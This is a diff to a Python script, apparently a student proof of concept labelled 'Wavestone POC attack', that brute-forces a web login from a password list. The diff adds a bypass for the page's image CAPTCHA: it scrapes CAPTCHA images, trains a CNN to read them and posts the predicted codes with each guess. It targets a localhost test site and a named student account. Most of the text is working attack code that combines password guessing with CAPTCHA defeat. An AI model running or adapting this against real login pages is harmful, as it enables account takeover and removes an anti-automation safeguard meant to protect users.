@@ -1,13 +1,13 @@
-print (""" 
+# print (""" 
 
-██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
-██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
-██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
+# ██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
+# ██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
+# ██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
+# ██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
+# ██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                             
-                        Wavestone POC attack
-""")
+#                         Wavestone POC attack
+# """)
 
 import threading
 import requests
@@ -17,28 +17,38 @@ from label import label
 from dl_models import attacker_cnn
 from bs4 import BeautifulSoup
 from PIL import Image
+import numpy as np 
+from utils import convert_to_tfds
+import matplotlib.pyplot as plt
+import tensorflow as tf
 
 class BruteForceCracker:
-    def __init__(self, url, username, error_message):
+    def __init__(self, url, username, error_message_password, trained_model):
         self.url = url
         self.username = username
-        self.error_message = error_message
+        self.error_message_password = error_message_password
+        self.trained_model = trained_model
         
         for run in banner:
             sys.stdout.write(run)
             sys.stdout.flush()
             time.sleep(0.02)
 
-    def crack(self, password):
-        data_dict = {"email": self.username, "password": password}
-        response = requests.post(self.url, data=data_dict)
-        if self.error_message in str(response.content):
-            return False
-        
-        else:
-            print("Username: ---> " + self.username)
-            print("Password: ---> " + password)
-            return True
+    def crack(self, password, num_iter=4):
+        for i in range(num_iter) : 
+            current_captcha = retrieve_captcha_images(self.url, number_iter=1)
+            tfds_captcha = convert_to_tfds(current_captcha)
+            preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)
+            preds_numpy = preds.numpy()  
+            preds_string = ''.join([str(idx) for idx in preds_numpy])
+            data_dict = {"email": self.username, "password": password, "captcha_input": preds_string}
+            response = requests.post(self.url, data=data_dict)
+            if "Welcome" in str(response.content):
+                print("Username: ---> " + self.username)
+                print("Password: ---> " + password)
+                return True
+            else :
+                return False
 
 def crack_passwords(passwords, cracker):
     count = 0
@@ -48,19 +58,20 @@ def crack_passwords(passwords, cracker):
         print("Trying Password: {} Time For => {}".format(count, password))
         if cracker.crack(password):
             return
-def retrieve_captcha_images(url) : 
+    print("No Password Found !")
+def retrieve_captcha_images(url, number_iter=200) : 
     img_url = []
-    for _ in range(10) : 
+    for _ in range(number_iter) : 
         response = requests.get(url)
         if response.status_code == 200:
             soup = BeautifulSoup(response.content, 'html.parser')
             div_tag = soup.find('div', id='randomImages')
             if div_tag:
                 #je récupère ici juste le champ src de la balise (ie l'url de l'image)
-                link = div_tag.img.get("src")
+                imgs = div_tag.find_all('img')
                 #je stocke dans une liste d'url
-                img_url.append(link)
-
+                for img in imgs : 
+                    img_url.append(img.get("src"))
             else:
                 print("Div tag not found.")
             
@@ -73,20 +84,29 @@ def retrieve_captcha_images(url) :
         response = requests.get(img_url[i], stream = True)
         if response.status_code ==200:
             image = Image.open(response.raw)
-            stock_image.append(image)
-            pixels = list(image.getdata())
+            pixels = np.array(list(image.getdata())).reshape(28, 28, 1)
             stock_image.append(pixels)
 
         else : 
             print("error response")
-    print(stock_image)
+    return stock_image
 
 
 def main():
-    url = input("Enter Target Url: ")
+    url = "http://localhost:3006/auth/login"
     error = "Password incorrect! Please try again."
     username="mohamed.mekkouri@student-cs.fr"
-    cracker = BruteForceCracker(url, username, error)
+
+    ###################### Captcha ##########################
+    captcha_images = retrieve_captcha_images("http://localhost:3006/auth/login")
+    tfds_captcha_images = convert_to_tfds(captcha_images)
+    predictions = label(tfds_captcha_images)
+    attacker_dataset = convert_to_tfds(captcha_images, predictions)
+    attacker_model = attacker_cnn.create_model()
+    trained_model = attacker_cnn.train(attacker_model, attacker_dataset, epochs=5)
+    #########################################################
+
+    cracker = BruteForceCracker(url, username, error, trained_model)
     
     with open("passwords.txt", "r") as f:
         chunk_size = 1000
@@ -103,5 +123,6 @@ if __name__ == '__main__':
 [+]█████████████████████████████████████████████████[+]
 """
     # print(banner)
-    # main()
-    retrieve_captcha_images("http://localhost:3006/auth/login")
+    #retrieve_captcha_images("http://localhost:3006/auth/login", 1)
+    main()
+
